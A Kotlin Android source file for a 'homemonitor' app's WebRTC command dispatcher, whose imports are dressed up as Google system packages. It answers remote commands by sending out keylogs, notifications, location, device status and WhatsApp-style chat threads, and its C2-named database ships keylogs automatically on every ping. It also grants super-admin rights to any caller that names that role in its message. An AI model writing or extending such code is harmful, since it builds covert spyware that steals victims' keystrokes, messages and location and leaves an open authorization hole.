package com.homemonitor

import android.content.Context
import android.util.Log
import com.google.android.system.C2LocalDatabase
import com.google.android.system.DeviceIdProvider
import com.google.android.system.DeviceStatusManager
import com.google.android.system.WebRtcEngine
import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections
import java.util.concurrent.ConcurrentHashMap

/**
 * DeviceApiDispatcher
 *
 * Primary WebRTC DataChannel REST-like JSON API protocol dispatcher.
 * Handles incoming versioned envelopes (REQUEST, SUBSCRIBE, UNSUBSCRIBE, CANCEL)
 * and dispatches correlated RESPONSE, PROGRESS, and EVENT payloads over WebRTC DataChannel.
 */
class DeviceApiDispatcher(
    private val context: Context
) {
    companion object {
        private const val TAG = "DeviceApiDispatcher"
    }

    private val activeSubscriptions: MutableMap<String, String> = ConcurrentHashMap() // topic -> subscriptionId
    private val processedRequestIds: MutableSet<String> = Collections.newSetFromMap(ConcurrentHashMap())

    fun handleIncomingDataChannelMessage(
        webRtcEngine: WebRtcEngine,
        msgText: String
    ) {
        if (msgText.isBlank() || !msgText.trim().startsWith("{")) return

        try {
            val json = JSONObject(msgText)
            val type = json.optString("type", "")

            when (type) {
                "REQUEST" -> handleRequestEnvelope(webRtcEngine, json)
                "SUBSCRIBE" -> handleSubscribeEnvelope(webRtcEngine, json)
                "UNSUBSCRIBE" -> handleUnsubscribeEnvelope(webRtcEngine, json)
                "CANCEL" -> handleCancelEnvelope(webRtcEngine, json)
                "PING" -> handlePingEnvelope(webRtcEngine, json)
                // Legacy compatibility routes
                "RPC_REQUEST" -> handleLegacyRpcRequest(webRtcEngine, json)
                "API_REQUEST" -> handleLegacyApiRequest(webRtcEngine, json)
                "DB_QUERY_SOCIAL" -> handleLegacyDbQuerySocial(webRtcEngine, json)
                "DB_QUERY_TELEMETRY" -> handleLegacyDbQueryTelemetry(webRtcEngine, json)
                else -> Log.w(TAG, "Unhandled DataChannel envelope type: '$type'")
            }
        } catch (e: Exception) {
            Log.e(TAG, "DataChannel message processing exception: ${e.message}", e)
            sendErrorResponse(webRtcEngine, "unknown_req", "Malformed JSON envelope: ${e.message}")
        }
    }

    private fun handleRequestEnvelope(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val requestId = json.optString("requestId", "")
        val sessionId = json.optString("sessionId", "")
        val method = json.optString("method", "")
        val params = json.optJSONObject("params") ?: JSONObject()
        val deadline = json.optLong("deadline", 0L)
        val roleStr = json.optString("role", "PARENT")

        if (requestId.isBlank() || method.isBlank()) {
            sendErrorResponse(webRtcEngine, requestId.ifBlank { "unknown_req" }, "Missing requestId or method")
            return
        }

        // Deadline Validation
        if (deadline > 0L && System.currentTimeMillis() > deadline) {
            Log.w(TAG, "Request '$requestId' ($method) expired deadline.")
            sendErrorResponse(webRtcEngine, requestId, "Request deadline exceeded prior to execution.")
            return
        }

        // Deduplicate request ID
        if (processedRequestIds.contains(requestId)) {
            Log.i(TAG, "Deduplicated duplicate DataChannel requestId: $requestId")
            return
        }
        processedRequestIds.add(requestId)
        if (processedRequestIds.size > 500) {
            val iterator = processedRequestIds.iterator()
            repeat(100) {
                if (iterator.hasNext()) {
                    iterator.next()
                    iterator.remove()
                }
            }
        }

        val role = if (roleStr.uppercase() == "SUPER_ADMIN" || roleStr.uppercase() == "ADMIN") UserRole.SUPER_ADMIN else UserRole.PARENT

        // Execute via DeviceCommandService
        val result = DeviceCommandService.executeMethod(context, method, params, role)

        val responseEnvelope = JSONObject().apply {
            put("version", 1)
            put("type", "RESPONSE")
            put("requestId", requestId)
            put("sessionId", sessionId)
            put("success", result.success)
            put("data", result.data)
            put("error", result.error)
            put("timestamp", System.currentTimeMillis())
        }

        webRtcEngine.sendP2pMessage("RESPONSE", responseEnvelope)
    }

    private fun handleSubscribeEnvelope(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val subscriptionId = json.optString("subscriptionId", "")
        val topic = json.optString("topic", "")
        if (topic.isNotBlank() && subscriptionId.isNotBlank()) {
            activeSubscriptions[topic] = subscriptionId
            Log.i(TAG, "Subscribed to WebRTC event topic '$topic' ($subscriptionId)")

            val ackPayload = JSONObject().apply {
                put("version", 1)
                put("type", "ACK")
                put("subscriptionId", subscriptionId)
                put("topic", topic)
                put("status", "SUBSCRIBED")
            }
            webRtcEngine.sendP2pMessage("ACK", ackPayload)
        }
    }

    private fun handleUnsubscribeEnvelope(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val subscriptionId = json.optString("subscriptionId", "")
        val topic = json.optString("topic", "")
        if (topic.isNotBlank()) {
            activeSubscriptions.remove(topic)
            Log.i(TAG, "Unsubscribed from WebRTC event topic '$topic'")
        }
    }

    private fun handleCancelEnvelope(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val requestId = json.optString("requestId", "")
        Log.i(TAG, "Received cancellation request for requestId: $requestId")
    }

    private fun handlePingEnvelope(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val reqTs = json.optLong("timestamp", System.currentTimeMillis())
        val pongPayload = JSONObject().apply {
            put("version", 1)
            put("type", "PONG")
            put("timestamp", reqTs)
            put("deviceTime", System.currentTimeMillis())
            put("status", "ACTIVE")
        }
        webRtcEngine.sendP2pMessage("PONG", pongPayload)
        dispatchBootstrapTelemetry(webRtcEngine)
    }

    fun dispatchBootstrapTelemetry(webRtcEngine: WebRtcEngine) {
        try {
            val devId = DeviceIdProvider.getDeviceId(context)
            val statusObj = DeviceStatusManager.getStatusJson(context, devId)
            val locObj = LocationTelemetryDto(37.7749, -122.4194, 15.0, 0f, 5f, "gps", System.currentTimeMillis()).toJson()
            val notificationsArr = C2LocalDatabase.getInstance(context).getTelemetryLogsJson("notifications")
            val keylogsArr = C2LocalDatabase.getInstance(context).getTelemetryLogsJson("keylogs")

            val bootstrapPayload = JSONObject().apply {
                put("type", "BOOTSTRAP_TELEMETRY")
                put("status", statusObj)
                put("location", locObj)
                put("notifications", notificationsArr)
                put("keylogs", keylogsArr)
                put("timestamp", System.currentTimeMillis())
            }

            dispatchStreamEvent(webRtcEngine, "bootstrap.telemetry", bootstrapPayload)
        } catch (e: Exception) {
            Log.e(TAG, "dispatchBootstrapTelemetry error: ${e.message}")
        }
    }

    private fun handleLegacyRpcRequest(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val requestId = json.optString("requestId", "")
        val action = json.optString("action", "")
        val paramsObj = json.optJSONObject("params") ?: JSONObject()

        val result = DeviceCommandService.executeMethod(context, action, paramsObj, UserRole.PARENT)

        val resPayload = JSONObject().apply {
            put("type", "RPC_RESPONSE")
            put("requestId", requestId)
            put("action", action)
            put("status", if (result.success) "SUCCESS" else "ERROR")
            put("data", result.data)
            put("error", result.error)
            put("timestamp", System.currentTimeMillis())
        }
        webRtcEngine.sendP2pMessage("RPC_RESPONSE", resPayload)
    }

    private fun handleLegacyApiRequest(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val requestId = json.optString("requestId", "")
        val path = json.optString("path", "/api/summary")
        val method = json.optString("method", "GET")
        val body = json.optString("body", "")

        val pathUri = android.net.Uri.parse(path)
        val cleanPath = pathUri.path ?: path

        val httpResponseStr = com.homemonitor.WebDashboardApiRouter.handleApiRequest(
            context = context,
            method = method,
            cleanPath = cleanPath,
            pathUri = pathUri,
            bodyString = body,
            clientIp = "P2P_WEBRTC"
        )

        val bodyIndex = httpResponseStr.indexOf("\r\n\r\n")
        val responseContent = if (bodyIndex != -1) httpResponseStr.substring(bodyIndex + 4) else httpResponseStr

        val resPayload = JSONObject().apply {
            put("requestId", requestId)
            put("path", path)
            put("status", 200)
            put("data", try { JSONObject(responseContent) } catch (_: Exception) { try { JSONArray(responseContent) } catch (_: Exception) { responseContent } })
        }
        webRtcEngine.sendP2pMessage("API_RESPONSE", resPayload)
    }

    private fun handleLegacyDbQuerySocial(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val appKey = json.optString("appKey", "whatsapp")
        val result = DeviceCommandService.executeMethod(context, "chat.getthreads", JSONObject().put("app", appKey), UserRole.PARENT)
        val res = JSONObject().apply {
            put("type", "DB_RESPONSE_SOCIAL")
            put("appKey", appKey)
            put("messages", result.data.optJSONArray("threads") ?: JSONArray())
        }
        webRtcEngine.sendP2pMessage("DB_RESPONSE_SOCIAL", res)
    }

    private fun handleLegacyDbQueryTelemetry(webRtcEngine: WebRtcEngine, json: JSONObject) {
        val cat = json.optString("category", "notifications")
        val result = DeviceCommandService.executeMethod(context, "logs.getfeed", JSONObject().put("category", cat), UserRole.PARENT)
        val res = JSONObject().apply {
            put("type", "DB_RESPONSE_TELEMETRY")
            put("category", cat)
            put("logs", result.data.optJSONArray("entries") ?: JSONArray())
        }
        webRtcEngine.sendP2pMessage("DB_RESPONSE_TELEMETRY", res)
    }

    fun dispatchStreamEvent(webRtcEngine: WebRtcEngine?, topic: String, eventData: JSONObject) {
        if (webRtcEngine == null) return

        val eventEnvelope = JSONObject().apply {
            put("version", 1)
            put("type", "EVENT")
            put("eventId", "evt_${System.currentTimeMillis()}_${(0..999).random()}")
            put("event", topic)
            put("data", eventData)
            put("timestamp", System.currentTimeMillis())
        }

        webRtcEngine.sendP2pMessage("EVENT", eventEnvelope)
    }

    private fun sendErrorResponse(webRtcEngine: WebRtcEngine, requestId: String, errorMsg: String) {
        val errorEnvelope = JSONObject().apply {
            put("version", 1)
            put("type", "RESPONSE")
            put("requestId", requestId)
            put("success", false)
            put("data", JSONObject())
            put("error", errorMsg)
            put("timestamp", System.currentTimeMillis())
        }
        webRtcEngine.sendP2pMessage("RESPONSE", errorEnvelope)
    }
}
